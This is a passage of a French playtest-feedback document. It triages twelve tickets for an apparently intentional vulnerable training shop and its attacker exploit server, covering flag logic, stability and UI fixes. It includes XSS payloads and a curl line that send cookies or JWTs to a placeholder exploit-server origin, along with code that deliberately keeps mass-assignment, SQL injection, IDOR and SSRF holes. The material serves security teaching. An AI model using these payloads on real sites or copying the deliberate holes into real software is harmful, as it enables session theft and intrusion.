# Retours de test — session playtest (~1 h, testeur externe)

Dépouillement des retours reçus après une session de test complète sur une instance
partagée. Chaque retour est repris sous forme de ticket : état actuel du code,
solution proposée, et pistes d'amélioration.

Les marqueurs 🔴 ouvert / 🟠 partiel / 🟢 corrigé non commité / ⚪ par design qui
apparaissent dans les tickets décrivent l'état **au moment du dépouillement**. Ils
sont conservés parce qu'ils expliquent le pourquoi de chaque correctif ; l'état
actuel est donné par le tableau ci-dessous.

**Synthèse** : 12 tickets, **tous traités**. Les correctifs sont commités un par
ticket ; le tableau ci-dessous suit l'état final. Chaque ticket conserve son
constat d'origine, qui explique le pourquoi du correctif.

| Ticket | Sujet | Commit |
| --- | --- | --- |
| [T-01](#t-01--webhook--lexemple-affiche-un-placeholder-au-lieu-de-lurl-réelle) | URL réelle du webhook + copie + payloads | `ea99d2f` |
| [T-02](#t-02--chute-du-service-sur-le-port-44003) | Stabilité du serveur d'exploit | `30e26b2` |
| [T-03](#t-03--qg-et-site-vulnérable-trop-proches-visuellement) | QG et shop distincts | `0b52659` |
| [T-04](#t-04--auto-pwn-sur-le-challenge--vol-de-cookie) | Vol de cookie non auto-validable | `38c15a0` |
| [T-05](#t-05--le-challenge--go-premium--renvoie-un-flag-nommé-r0l3_4dm1n) | Deux challenges séparés | `fa7cc9a` |
| [T-06](#t-06--rôles-arbitraires-acceptés-et-validation-du-rôle-admin-par-reconnexion) | Rôles bornés | `f869204` |
| [T-07](#t-07--ladmin-peut-valider-le-challenge-1000-crédits-par-effet-de-bord) | Flag sur l'acte, pas le solde | `42d580f` |
| [T-08](#t-08--apiusersid-expose-la-balance-de-tous-les-utilisateurs) | Vulnérabilités volontaires documentées | `5bae78e` |
| [T-09](#t-09--ssrf--apiinternalflag-accessible-directement) | SSRF réactivée | `9db4544` |
| [T-10](#t-10--mémos--fix-it--difficilement-lisibles) | Fix-It lisibles | `6d6cf12` |
| [T-11](#t-11--la-seconde-injection-sql-na-pas-été-trouvée) | UNION SQLi en deux temps | `65319a4` |
| [T-12](#t-12--chevauchement-des-scénarios-entre-challenges) | Vue des chemins + prérequis | `31d8675` |

**Socle transverse** livré avant les tickets : moteur `awardFlag()` (`34c146b`),
prérequis déclaratifs (`fa181fb`), détection et trois classes de réponse
(`4b53728`). **Annexe C** (expérience étudiante) : `b6b0eec` → `63e58ba`.
**Tests de non-régression** : `4c26e75` (`npm test`).

---

## T-01 — Webhook : l'exemple affiche un placeholder au lieu de l'URL réelle

**Retour** : « remplacer l'exemple `http://EXPLOIT_SERVER:PORT/log?data=...` par le vrai
domaine + port du serveur d'exploit ».

**Statut** : ✅ **Résolu** — commit `ea99d2f`.

**Constat d'origine** : 🔴 Ouvert — le placeholder est toujours en dur dans
[WebhookPage.jsx:53](../exploit-server/client/src/pages/WebhookPage.jsx#L53).

**Analyse** : la page est servie par le serveur d'exploit lui-même, donc l'URL publique
est déjà connue côté navigateur via `window.location.origin` — aucune variable
d'environnement supplémentaire n'est nécessaire (le port publié côté hôte diffère du
port interne `4000`, donc côté serveur l'info n'est pas fiable, contrairement au
navigateur).

**Solution** :

```jsx
// exploit-server/client/src/pages/WebhookPage.jsx
<code>{`${window.location.origin}/log?data=...`}</code>
```

**Améliorations** :
- Ajouter un bouton « copier » à côté de l'URL (gain de temps réel pendant un atelier,
  et évite les fautes de frappe dans les payloads XSS).
- Proposer directement deux payloads prêts à coller, construits sur la même origine :
  `<img src=x onerror="fetch('<origin>/log?c='+document.cookie)">` et la variante `new Image()`.
- Appliquer la même substitution partout où l'URL du QG apparaît (académie, page
  challenges, onboarding) : un seul helper `exploitOrigin()` exporté côté client.

---

## T-02 — Chute du service sur le port 44003

**Retour** : « le service sur le port 44003 est tombé deux fois en environ une heure […]
impression que le serveur redémarre complètement ou subit une forte charge ».

**Statut** : ✅ **Résolu** — commit `30e26b2`.

**Constat d'origine** : 🔴 Ouvert — cause probable identifiée, non corrigée.

**Analyse** : avec `START_PORT=44001`, le port 44003 est le **serveur d'exploit de
l'équipe 1**. Trois éléments du code et de la conf convergent vers un OOM‑kill suivi d'un
redémarrage automatique (`restart: unless-stopped`), ce qui correspond exactement au
symptôme décrit (« le serveur redémarre complètement ») :

1. [setup.sh:381](../setup.sh#L381) fixe `mem_limit: 128m` sur le conteneur exploit. Un
   Node moderne y est déjà à l'étroit au repos.
2. [exploit-server/src/index.js:22-24](../exploit-server/src/index.js#L22-L24) accepte des
   corps jusqu'à **1 Mo** (`json`, `urlencoded` **et** `text` avec `type: "*/*"`), et
   [index.js:205-240](../exploit-server/src/index.js#L205-L240) conserve jusqu'à
   `MAX_REQUESTS = 200` requêtes **en mémoire, corps compris**. Soit un pire cas de
   ~200 Mo pour un conteneur limité à 128 Mo.
3. `saveRequests()` réécrit **tout** le fichier JSON de façon synchrone à *chaque* hit sur
   `/log` ([index.js:50-58](../exploit-server/src/index.js#L50-L58)) : avec un fichier de
   plusieurs Mo, chaque requête sérialise l'ensemble en mémoire et bloque la boucle
   d'événements, ce qui fait aussi échouer le healthcheck (`timeout: 5s`).

Aucun `process.on('uncaughtException')` n'est posé : une exception non gérée tue
directement le process.

**Solution** :

```js
// 1. Tronquer ce qui est stocké, pas seulement ce qui est accepté
const MAX_BODY_CHARS = 4096;
const stored = typeof body === 'string' ? body.slice(0, MAX_BODY_CHARS) : body;

// 2. Débouncer la persistance (au lieu d'un writeFileSync par hit)
let saveTimer = null;
function scheduleSave() {
  if (saveTimer) return;
  saveTimer = setTimeout(() => { saveTimer = null; saveRequests(); }, 1000);
}

// 3. Filet de sécurité : logguer avant de mourir
process.on('uncaughtException', (e) => console.error('FATAL', e));
process.on('unhandledRejection', (e) => console.error('UNHANDLED', e));
```

Et côté conf : passer `mem_limit` à `256m` pour le serveur d'exploit, et abaisser les
limites de corps (`limit: "64kb"` suffit très largement pour un webhook d'exfiltration).

**Améliorations** :
- Ajouter un rate-limit simple sur `/log` (par ex. 20 req/s par IP) : un participant qui
  lance un scanner sur son propre QG ne doit pas pouvoir le faire tomber.
- Vérifier après coup avec `docker inspect <container> --format '{{.State.OOMKilled}}'`
  et `docker compose logs --since 2h exploit-team1` : ça confirmera (ou infirmera) l'OOM
  en une commande, à faire dès la prochaine occurrence.
- Ajouter un compteur de redémarrages visible côté animateur (le dashboard connaît déjà
  chaque équipe) — un service qui redémarre pendant l'atelier doit être vu sans lire les logs.

---

## T-03 — QG et site vulnérable trop proches visuellement

**Retour** : « différencier visuellement le QG et le site vulnérable, par exemple avec une
couleur de fond différente […] on peut facilement se perdre entre les deux ».

**Statut** : ✅ **Résolu** — commit `0b52659`.

**Constat d'origine** : 🔴 Ouvert — les deux fronts partagent exactement la même base de thème :
`--color-bg: 14 11 17` dans [client/src/index.css:7](../client/src/index.css#L7) **et**
dans [exploit-server/src/index.css:7](../exploit-server/client/src/index.css#L7).

**Solution** : donner au Hacking QG une identité propre plutôt que de retoucher deux ou
trois composants :

- Fond nettement distinct sur le QG (par ex. bleu nuit `--color-bg: 8 14 26`) contre le
  violet sombre actuel du shop, en gardant les mêmes accents pour rester dans la charte.
- Bandeau persistant en haut de chaque front : `⚔️ HACKING QG` / `🍌 BANANASHOP (cible)`,
  avec la couleur de l'environnement.
- Favicon et `<title>` distincts (les participants travaillent avec 4–5 onglets ouverts,
  c'est là que la confusion coûte le plus cher).

**Améliorations** :
- Afficher l'URL de la cible dans le bandeau du QG (résout aussi une partie de [T-01](#t-01--webhook--lexemple-affiche-un-placeholder-au-lieu-de-lurl-réelle)).
- Bordure colorée de 3–4 px sur tout le viewport du site vulnérable : reste visible même
  quand une capture d'écran est projetée.

---

## T-04 — Auto-pwn sur le challenge « Vol de cookie »

**Retour** : « je peux m'auto-pwn en envoyant mon propre cookie vers le serveur d'exploit
[…] il faudra peut-être filtrer l'IP entrante ou éviter de fournir un vrai cookie. Une
alternative serait de mettre le flag encodé en base64 dans une valeur de cookie dédiée ».

**Statut** : ✅ **Résolu** — commit `38c15a0`.

**Constat d'origine** : 🟠 Partiel.

**Analyse** : deux problèmes distincts se cachaient derrière ce retour.

1. **Le flag était lisible sans aucune exfiltration** : le JWT des comptes admin
   embarquait `FLAGS.COOKIE_THEFT` dans ses claims — n'importe quelle équipe ayant réussi
   le bypass SQLi pouvait le lire sur jwt.io. ✅ Corrigé dans l'arbre de travail
   ([auth.js:77-80](../server/src/routes/auth.js#L77-L80)), **pas encore commité**.
2. **L'auto-exfiltration valide le challenge** : toujours d'actualité.
   [exploit-server/src/index.js:215-233](../exploit-server/src/index.js#L215-L233) délivre
   le flag dès qu'un JWT — n'importe lequel — apparaît dans la query string de `/log`.

Sur le fond, l'auto-XSS *est* le chemin pédagogique normal (il n'y a pas de bot victime
sur la plateforme), donc ce n'est pas un unintended au sens strict. Le vrai problème est
qu'aucune preuve n'est demandée : un simple `curl '<qg>/log?c=<mon_jwt>'` suffit, sans
jamais écrire une balise `<img onerror>`.

**Solution** (par ordre d'effort croissant) :

- **Minimal** : exiger que le hit sur `/log` porte les marqueurs d'une exécution
  navigateur depuis le site cible — `Referer`/`Origin` pointant sur le shop, et un
  `User-Agent` non-CLI. Un `curl` manuel ne les a pas, un payload XSS les a gratuitement.
- **Recommandé (reprend la suggestion du testeur)** : poser sur le shop un cookie dédié
  non-httpOnly, `ctf_secret=<flag en base64>`, qui n'a aucune autre raison d'exister. Le
  flag n'est validé que si c'est **cette** valeur qui arrive sur `/log`. L'exfiltration
  doit alors réellement passer par `document.cookie`, et le JWT reste hors-sujet.
- **Complet** : un bot « victime » (Puppeteer headless) qui visite périodiquement les
  pages produit et déclenche le XSS stocké. C'est le vrai scénario, mais c'est un service
  de plus à faire tenir dans l'enveloppe mémoire — à arbitrer avec [T-02](#t-02--chute-du-service-sur-le-port-44003).

**Améliorations** :
- Afficher dans le listener *pourquoi* le flag est tombé (« cookie `ctf_secret` détecté »),
  pour que le participant comprenne ce qui a été validé — c'est précisément le flou décrit en [T-12](#t-12--chevauchement-des-scénarios-entre-challenges).

---

## T-05 — Le challenge « Go Premium » renvoie un flag nommé `r0l3_4dm1n`

**Retour** : « le challenge de mass assignment "go to premium" retourne le flag
`ASY{m4ss_4ss1gn_r0l3_4dm1n}`. Ça ressemble à un mauvais flag ».

**Statut** : ✅ **Résolu** — commit `fa7cc9a`.

**Constat d'origine** : 🔴 Ouvert — cosmétique mais déroutant.

**Analyse** : un seul flag `MASS_ASSIGNMENT` couvre deux exploitations différentes
(passer premium sans payer, et se donner `role: admin`), et sa valeur ne parle que de la
seconde. Le challenge, lui, s'appelle « Go Premium »
([shared/flags.json](../shared/flags.json)).

**Solution** — deux options, à trancher selon le découpage souhaité :

1. **Aligner les noms** (5 min) : renommer le challenge en « Mass Assignment » et le flag
   en `ASY{m4ss_4ss1gn_ch4mp_3n_tr0p}`.
2. **Séparer en deux challenges** (recommandé, et cohérent avec la ligne du TODO
   « pouvoir changer de rôle avec le mass assignment ») :
   - `MASS_ASSIGNMENT` → « Go Premium » (Moyen) → `ASY{pr3m1um_s4ns_p4y3r}`
   - `PRIV_ESC_ROLE` → « Changement de rôle » (Moyen) → `ASY{m4ss_4ss1gn_r0l3_4dm1n}`

   [users.js:56-58](../server/src/routes/users.js#L56-L58) distingue déjà `gotPremium` de
   `gotAdmin` : il suffit de renvoyer deux flags distincts.

---

## T-06 — Rôles arbitraires acceptés, et validation du rôle admin par reconnexion

**Retour** : « l'API accepte des valeurs arbitraires comme admin ou superadmin (ou même
tartanpion) […] Après déconnexion/reconnexion, j'obtiens le flag de l'utilisateur admin,
et ça me valide le chall de la première SQLi ».

**Statut** : ✅ **Résolu** — commit `f869204`.

**Constat d'origine** : 🟠 Partiel.

**Analyse** :

- **Faux positif sur le flag SQLi** : ✅ corrigé depuis la session de test (commit
  `06053b7`). L'ancienne détection était une heuristique `username.includes('--')`, qui
  déclenchait le flag hors injection réelle. La version actuelle
  ([auth.js:74](../server/src/routes/auth.js#L74)) ne le donne que si la requête injectée
  a réellement retourné une ligne (`usedSqli && role === 'admin'`), ce qu'un login
  légitime ne peut pas produire — un mot de passe en clair ne peut pas égaler un hash bcrypt.
- **Flag mass assignment sur un rôle bidon** : ✅ corrigé dans l'arbre de travail — le
  flag ne tombe plus que sur une vraie élévation (`role === 'admin'` et l'utilisateur ne
  l'était pas), [users.js:56-58](../server/src/routes/users.js#L56-L58). Non commité.
- **Valeurs arbitraires toujours écrites en base** : 🔴 ouvert.
  [users.js:48-49](../server/src/routes/users.js#L48-L49) écrit `role` tel quel, donc
  `role: "tartanpion"` est persisté. Le compte devient alors ni user ni admin, et
  l'interface peut se comporter de façon incohérente pour le reste de la session.

**Solution** : garder la vulnérabilité (c'est le challenge) mais borner les dégâts par une
liste blanche de valeurs *valides*, sans contrôle d'autorisation :

```js
const VALID_ROLES = ['user', 'admin'];
if (role && !VALID_ROLES.includes(role)) {
  return res.status(400).json({ error: 'Rôle inconnu' });
}
// aucune vérification d'autorisation : le mass assignment reste exploitable
```

**Améliorations** :
- La reconnexion obligatoire pour que le nouveau rôle prenne effet (JWT signé à
  l'authentification) est en soi une bonne leçon — mais elle mérite d'être dite. Ajouter
  au message de succès : « rôle modifié en base — reconnectez-vous pour obtenir un jeton
  à jour ».
- Ne surtout pas ré-émettre automatiquement le JWT : ça supprimerait un point
  pédagogique (les jetons sont des instantanés).

---

## T-07 — L'admin peut valider le challenge « 1000 crédits » par effet de bord

**Retour** : « depuis un accès admin, je peux attribuer 10.000 crédits à n'importe quel
utilisateur […] si je me reconnecte sur mon utilisateur test et que je fais un virement
normal de 30 crédits, le flag est validé […] le scénario attendu semblait plutôt être un
virement avec montant négatif. Il faudrait aussi provisionner le compte admin avec une
très grosse balance ».

**Statut** : ✅ **Résolu** — commit `42d580f`.

**Constat d'origine** : 🔴 Ouvert — c'est le plus gênant des unintended remontés.

**Analyse** : [credits.js:66-69](../server/src/routes/credits.js#L66-L69) accorde le flag
sur un **état** (`balance > 999`) et non sur l'**exploitation** (un virement négatif). Or
cet état est atteignable par au moins trois chemins : le virement négatif (intentionnel),
le panneau admin, et une succession de top-ups (plafonnés à 1000 unitairement mais non
cumulativement, [credits.js:11-14](../server/src/routes/credits.js#L11-L14)).

Sur une instance partagée, l'effet secondaire est réel : un participant devenu admin peut
recréditer — ou vider — les comptes des autres.

**Solution** : conditionner le flag à la preuve de l'exploitation, pas au solde.

```js
// credits.js — le flag récompense le virement négatif lui-même
if (sendAmount < 0) {
  response.flag = FLAGS.BUSINESS_LOGIC;
  response.message += ' 🎉 Montant négatif accepté — la logique métier est contournée !';
}
```

Complément : provisionner le compte admin à `1000000` au seed
([db.js:78](../server/src/db.js#L78), actuellement `999`). À noter que l'édition admin
*fixe* le solde (`SET balance = ?`, [admin.js:65](../server/src/routes/admin.js#L65)) et ne
débite pas l'admin — il n'y a donc pas de rupture de fonds à proprement parler, mais un
solde admin crédible reste préférable pour la mise en scène.

**Améliorations** :
- Rendre le seuil de solde explicite dans l'énoncé du challenge (« dépasser 1000 crédits
  **par un virement** »), pour que le joueur sache ce qui est mesuré.
- Prévoir un `./setup.sh reset-team <nom>` : quand un participant a saccagé l'économie de
  son instance, remettre à zéro une seule équipe plutôt que tout l'événement.
- Ajouter un test automatisé (déjà dans le TODO) qui vérifie *qu'un chemin non prévu ne
  donne pas le flag* — pas seulement que le chemin prévu le donne.

---

## T-08 — `/api/users/:id` expose la balance de tous les utilisateurs

**Retour** : « à vérifier si c'est voulu ».

**Statut** : ✅ **Résolu** — commit `5bae78e`.

**Constat d'origine** : ⚪ Par design — c'est exactement le challenge IDOR (« Mes données = Tes
données », Facile), [users.js:10-20](../server/src/routes/users.js#L10-L20). L'absence de
contrôle d'accès *est* la vulnérabilité à trouver.

**Améliorations** :
- Rien à corriger, mais ce doute mérite une réponse dans la doc : une section
  « vulnérabilités volontaires » dans [docs/ANIMATEUR.md](ANIMATEUR.md), listant ce qui
  est intentionnel, éviterait à un testeur (ou un animateur) de se demander s'il a trouvé
  un bug ou un challenge.
- À noter : le champ `bio` qui porte le flag IDOR est désormais protégé en écriture
  ([users.js:35-38](../server/src/routes/users.js#L35-L38), non commité) — sans ça une
  équipe pouvait détruire son propre challenge en écrasant la bio.

---

## T-09 — SSRF : `/api/internal/flag` accessible directement

**Retour** : « j'ai pu récupérer le flag directement en accédant à `/api/internal/flag`.
Ça ressemble à un endpoint interne exposé directement ».

**Statut** : ✅ **Résolu** — commit `9db4544`.

**Constat d'origine** : 🟢 Corrigé (non commité).

**Analyse** : l'endpoint est maintenant restreint au loopback
([server/src/index.js:54-61](../server/src/index.js#L54-L61)) — la requête doit provenir du
serveur lui-même, donc d'une vraie SSRF via `POST /api/products/:id/image-url`. Un accès
direct depuis le navigateur renvoie un 403.

À noter aussi : le challenge SSRF est `enabled: false` dans
[shared/flags.json](../shared/flags.json) — il ne rapporte aucun point et n'apparaît pas
dans la liste. C'est cohérent avec « je n'ai pas compris le chemin attendu » : le challenge
n'était pas censé être visible.

**Améliorations** :
- Si le challenge est réactivé, remplacer son `hint` (`"XXXXX"`) et guider vers le
  formulaire « URL de l'image » d'un produit, seul point d'entrée SSRF de l'appli.
- Un garde-fou loopback ne bloque pas un participant qui ferait tourner le payload depuis
  le conteneur : acceptable ici, mais à garder en tête si le scénario évolue.

---

## T-10 — Mémos « Fix-It » difficilement lisibles

**Retour** : « les mémos Fix It sont difficilement lisibles : texte gris sur fond noir ».

**Statut** : ✅ **Résolu** — commit `6d6cf12`.

**Constat d'origine** : 🔴 Ouvert.

**Analyse** : le corps de texte utilise `--color-text-muted`
([ChallengesPage.jsx:294](../exploit-server/client/src/pages/ChallengesPage.jsx#L294)), soit
`rgba(255,255,255,0.6)` sur un fond **codé en dur** `#1a1a2e`
([ChallengesPage.jsx:260](../exploit-server/client/src/pages/ChallengesPage.jsx#L260)). Le
ratio de contraste tombe autour de 6:1 sur du 0.9 rem — passable en théorie, nettement
moins sur un vidéoprojecteur ou un écran mal calibré. Pire : le fond est en dur, donc en
thème clair le texte gris clair se retrouve sur un fond sombre imposé, incohérent avec le
reste de la page.

**Solution** :

```jsx
// Fond : suivre le thème au lieu d'un #1a1a2e en dur
background: 'rgb(var(--color-bg-secondary))'
// Corps de texte : pleine opacité, muted réservé aux métadonnées
color: 'var(--color-text)'
```

**Améliorations** :
- Le Fix-It est du contenu pédagogique destiné à être lu longuement : monter le corps à
  `1rem` / `line-height: 1.6`, contre `0.9rem` / `1.5` aujourd'hui.
- Les deux blocs de code sont en grille `1fr 1fr` fixe : les passer en une colonne sous
  ~800 px, sinon le code est illisible sur un petit écran d'atelier.
- Le Fix-It est désormais réservé aux flags réellement capturés
  ([exploit-server/src/index.js:159-186](../exploit-server/src/index.js#L159-L186), non
  commité) — bonne chose, puisqu'il contient le code vulnérable, donc la solution.

---

## T-11 — La seconde injection SQL n'a pas été trouvée

**Retour** : « je n'ai pas identifié la seconde injection SQL, si elle existe […] je ne
sais pas si le scénario attendu est une exploitation manuelle ou plutôt SQLMap ».

**Statut** : ✅ **Résolu** — commit `65319a4`.

**Constat d'origine** : 🔴 Ouvert — problème de découvrabilité, pas d'absence.

**Analyse** : elle existe bien — UNION-based sur `GET /api/products?search=`
([products.js:18-25](../server/src/routes/products.js#L18-L25)), challenge « SQL Injection
(UNION) », Difficile. Deux raisons de ne pas la trouver en une heure :

1. **Aucun retour d'erreur** : le `catch { products = [] }` avale toute erreur SQL. Le
   joueur voit « aucun résultat », exactement comme pour une recherche infructueuse. Il n'a
   aucun signal lui indiquant qu'il a cassé la requête — c'est-à-dire aucun signal qu'une
   injection existe. C'est aussi ce qui rend SQLMap peu concluant ici.
2. **L'indice ne dit pas où chercher** : il renvoie à l'academy et à PayloadsAllTheThings,
   sans nommer la fonctionnalité vulnérable.

**Solution** :

```js
// products.js — renvoyer l'erreur SQL, comme le ferait une appli réellement mal codée
} catch (err) {
  return res.status(500).json({ error: `SQL error: ${err.message}` });
}
```

C'est doublement juste : c'est le comportement d'une application vulnérable réelle, et ça
transforme un challenge blind (très dur) en error-based (accessible au public visé).
L'affichage du nombre de colonnes attendu via le message d'erreur est précisément ce qui
débloque un UNION SELECT.

**Améliorations** :
- Reformuler l'indice : « la recherche de produits filtre directement sur le texte
  saisi — que se passe-t-il avec une apostrophe ? ».
- Découper en deux temps, dans l'esprit des « challenges tiroirs » de [T-12](#t-12--chevauchement-des-scénarios-entre-challenges) : (a) faire
  apparaître une erreur SQL → indice ; (b) extraire la table `secrets` → flag.
- Documenter côté animateur la position officielle sur SQLMap (outillé ou manuel), pour
  que les équipes ne perdent pas 20 minutes sur la mauvaise approche.

---

## T-12 — Chevauchement des scénarios entre challenges

**Retour** : « certains scénarios sont trop proches […] une exploitation prévue pour un
challenge peut en valider un autre […] on ne sait pas toujours si on a trouvé le bon
chemin, une variante intéressante, ou juste déclenché un comportement non prévu ». Piste
proposée : des « challenges tiroirs » en plusieurs étapes.

**Statut** : ✅ **Résolu** — commit `31d8675`.

**Constat d'origine** : 🔴 Ouvert — c'est le retour de fond, dont [T-04](#t-04--auto-pwn-sur-le-challenge--vol-de-cookie), [T-06](#t-06--rôles-arbitraires-acceptés-et-validation-du-rôle-admin-par-reconnexion) et [T-07](#t-07--ladmin-peut-valider-le-challenge-1000-crédits-par-effet-de-bord) sont les
symptômes.

**Analyse** : un motif commun relie ces trois tickets — **plusieurs flags sont accordés sur
un état atteint, pas sur l'exploitation réalisée** :

| Challenge | Condition actuelle | Nature |
| --- | --- | --- |
| 1000 crédits | `balance > 999` | état → multi-chemins |
| Vol de cookie | un JWT dans la query de `/log` | état → `curl` suffit |
| Go Premium | `subscription === 'premium'` | état (resserré depuis, non commité) |
| SQLi login | la requête injectée a retourné une ligne | ✅ exploitation |
| Path traversal | le fichier lu contient le flag | ✅ exploitation |

Les deux dernières lignes montrent que le bon motif est déjà présent dans le code : la
condition porte sur l'acte, pas sur son résultat observable.

**Solution** — règle transverse à appliquer challenge par challenge :

> Un flag se valide sur **l'acte d'exploitation**, jamais sur un état que d'autres chemins
> peuvent produire.

En pratique : [T-07](#t-07--ladmin-peut-valider-le-challenge-1000-crédits-par-effet-de-bord) (virement négatif), [T-04](#t-04--auto-pwn-sur-le-challenge--vol-de-cookie) (cookie dédié), [T-05](#t-05--le-challenge--go-premium--renvoie-un-flag-nommé-r0l3_4dm1n) (un flag par
exploitation). Et dans le message de succès, dire **ce qui** a été validé — « montant
négatif accepté », « cookie `ctf_secret` exfiltré » — au lieu d'un « bravo » générique :
c'est ce qui dissipe le doute « bug ou challenge ? ».

**Améliorations** :
- **Challenges tiroirs** (la piste du testeur) — un fil rouge où chaque étape débloque la
  suivante, ce que l'application permet déjà sans nouvelle vulnérabilité :
  1. IDOR sur `/api/users/:id` → découverte du compte `admin`
  2. UNION SQLi sur la recherche → extraction du hash / des secrets
  3. SQLi login → accès admin
  4. JWT forging → `super_admin`

  Chaque étape donne un flag *et* un prérequis pour la suivante. Les challenges « user de
  base » (rating, mass assignment, XSS) restent en satellite, jouables dans n'importe quel
  ordre.
- **Tests de non-régression des flags** (déjà au TODO) : pour chaque challenge, un test
  « chemin prévu → flag » **et** un test « chemin voisin → pas de flag ». C'est le seul
  moyen de garder les scénarios étanches dans la durée.
- **Mode animateur** : une vue listant, par équipe, le chemin emprunté pour chaque
  capture. Permet de repérer en direct qu'une équipe a validé par effet de bord.

### Conception retenue : deux fonctionnalités de plateforme

Plutôt que de corriger challenge par challenge, deux briques transverses garantissent
qu'une exploitation ne peut pas en valider une autre. ✅ **Implémentées** :
`server/src/award.js` (`34c146b`) et les prérequis déclaratifs (`fa181fb`).

#### a. `awardFlag()` — point de sortie unique pour les flags

Les flags sortent aujourd'hui de 11 endroits indépendants
(`response.flag = FLAGS.X` dans [credits.js:69](../server/src/routes/credits.js#L69),
[users.js:63](../server/src/routes/users.js#L63),
[reviews.js:79](../server/src/routes/reviews.js#L79)…). Aucune vue d'ensemble, donc rien
ne peut arbitrer entre deux conditions qui tombent sur la même requête.

Un module `server/src/award.js` remplace ces 11 sites d'appel :

```js
// reviews.js — deux conditions peuvent matcher sur le MÊME POST
awardFlag(req, response, 'ZERO_RATING', { proof: 'rating_out_of_range', value: safeRating });
awardFlag(req, response, 'STORED_XSS',  { proof: 'payload_stored', vector: '<img onerror>' });
// → un seul des deux est délivré ; l'autre est journalisé et reste à trouver
```

Trois garanties, toutes portées par le module :

- **Preuve obligatoire** — pas de `proof`, pas de flag. La règle « valider l'acte, pas
  l'état » devient structurelle au lieu d'être une convention que chaque nouveau
  challenge peut oublier.
- **Un flag par requête HTTP** — si deux conditions matchent, la preuve la plus
  spécifique gagne ; l'autre est enregistrée comme « effleurée ». C'est la réponse
  directe à « ne pas découvrir deux vulnérabilités d'un coup ».
- **Journal `challenge_events`** (user, flagId, proof, endpoint, timestamp) — nouvelle
  table aux côtés de `transactions`. Donne à l'animateur le *chemin* de chaque validation,
  donc la détection en direct des effets de bord.

#### b. Prérequis déclaratifs — champ `requires` dans `shared/flags.json`

```json
{ "flagId": "BUSINESS_LOGIC", "name": "1000 crédits",  "requires": [] },
{ "flagId": "JWT_FORGING",    "name": "Go superadmin", "requires": ["SQLI"] }
```

`awardFlag()` interroge le scoreboard du dashboard — le serveur d'exploit le fait déjà
via `hasCaptured()` ([exploit-server/src/index.js:163](../exploit-server/src/index.js#L163))
— et, prérequis manquants, ne délivre pas le flag : message neutre « l'état a bien été
modifié, mais ce n'est pas le chemin de ce challenge ». Le cas *admin → 10 000 crédits →
flag « 1000 crédits »* ([T-07](#t-07--ladmin-peut-valider-le-challenge-1000-crédits-par-effet-de-bord)) s'éteint sans avoir à interdire le panneau admin.

Le même champ alimente l'affichage en escalier côté QG (`🔒 nécessite « SQL Injection »`) :
la brique des « challenges tiroirs » est obtenue au passage.

#### Limite connue

Les flags sont des chaînes statiques, partagées entre toutes les équipes. Ces deux
fonctionnalités contrôlent **l'émission** du flag, pas sa circulation : une équipe qui
obtient `ASY{...}` autrement peut toujours le soumettre. Rendre les flags dérivés par
équipe (HMAC de `flagId + teamName`) est un troisième chantier, indépendant et nettement
plus lourd.

---

## Points annexes relevés pendant l'analyse

Non signalés par le testeur, mais découverts en instruisant les tickets :

- **Top-up non plafonné cumulativement** : `POST /api/credits/topup` limite chaque
  opération à 1000 crédits, sans plafond global
  ([credits.js:11-14](../server/src/routes/credits.js#L11-L14)). Onze appels suffisent à
  dépasser 999 — troisième chemin non prévu vers le flag « 1000 crédits » (cf. [T-07](#t-07--ladmin-peut-valider-le-challenge-1000-crédits-par-effet-de-bord)).
- **Correctifs en attente de commit** : l'arbre de travail contient des correctifs
  importants et non commités (barème de points calculé côté dashboard au lieu d'être lu
  dans la requête, jetons par équipe contre les captures forgées, garde loopback SSRF,
  Fix-It réservé aux flags capturés, flag Cookie Theft retiré du JWT). Ils répondent
  partiellement à [T-04](#t-04--auto-pwn-sur-le-challenge--vol-de-cookie), [T-06](#t-06--rôles-arbitraires-acceptés-et-validation-du-rôle-admin-par-reconnexion) et [T-09](#t-09--ssrf--apiinternalflag-accessible-directement) : à commiter avant le prochain événement, sans
  quoi ces tickets rouvriront tels quels.
- **`X-Frame-Options: ALLOW`** ([server/src/index.js:20](../server/src/index.js#L20)) est
  une valeur invalide — volontaire, mais l'en-tête est alors simplement ignoré par les
  navigateurs. Si l'objectif est de permettre le clickjacking, ne pas envoyer l'en-tête du
  tout produit le même effet plus honnêtement.

---

# Annexe A — Isoler une vulnérabilité derrière une fonctionnalité métier dédiée

> Question posée : *ajouter une fonctionnalité métier sur le site pour y loger une
> vulnérabilité existante, et garantir qu'elle ne chevauche plus rien ?*

## Le principe, et sa limite

Ce n'est **pas la fonctionnalité** qui garantit l'isolation : c'est le fait que **l'état
mesuré n'ait qu'un seul producteur**. Ajouter une page ne sert à rien si le flag continue
de se valider sur `balance > 999`, un solde que trois chemins alimentent.

Avant d'écrire la moindre ligne, trois questions décident si une nouvelle fonctionnalité
est justifiée :

1. **L'état mesuré a-t-il d'autres producteurs légitimes ?** (panneau admin, seed, autre
   endpoint) → si oui, une fonctionnalité dédiée avec son propre état résout le problème.
2. **La preuve est-elle observable sans l'exploit ?** (cas du vol de cookie : le joueur
   possède déjà le cookie qu'il est censé voler) → si oui, il faut un état auquel il n'a
   pas accès, donc un acteur tiers.
3. **La condition est-elle simplement mal écrite ?** → alors corriger la condition, pas
   ajouter une page.

**Le contre-argument, qui vaut d'être dit** : chaque fonctionnalité ajoutée est une
surface de plus, donc de nouveaux chevauchements potentiels. [T-05](#t-05--le-challenge--go-premium--renvoie-un-flag-nommé-r0l3_4dm1n) se règle en renommant un
flag et en séparant deux conditions déjà distinctes dans le code : y consacrer une
fonctionnalité serait du poids pur. La règle : **une fonctionnalité métier quand l'état a
plusieurs producteurs ([T-07](#t-07--ladmin-peut-valider-le-challenge-1000-crédits-par-effet-de-bord)) ou pas d'acteur tiers ([T-04](#t-04--auto-pwn-sur-le-challenge--vol-de-cookie)) ; une correction de condition partout
ailleurs.**

Sur les 12 tickets, deux seulement passent ce filtre. Les voici.

> **État** : annexe non implémentée. [T-07](#t-07--ladmin-peut-valider-le-challenge-1000-crédits-par-effet-de-bord) et [T-04](#t-04--auto-pwn-sur-le-challenge--vol-de-cookie) ont été résolus en corrigeant la
> condition d'attribution (flag sur l'acte, cookie dédié), sans ajouter de surface
> applicative. Ces deux propositions restent valables si le besoin revient.

## A1 — « Mes commandes » + demande de remboursement → héberge le challenge logique métier

**Résout** : [T-07](#t-07--ladmin-peut-valider-le-challenge-1000-crédits-par-effet-de-bord) (trois chemins mènent au flag « 1000 crédits ») et le point annexe sur
le top-up non plafonné.

**Ce qui manque aujourd'hui** : l'achat n'écrit que dans `transactions`
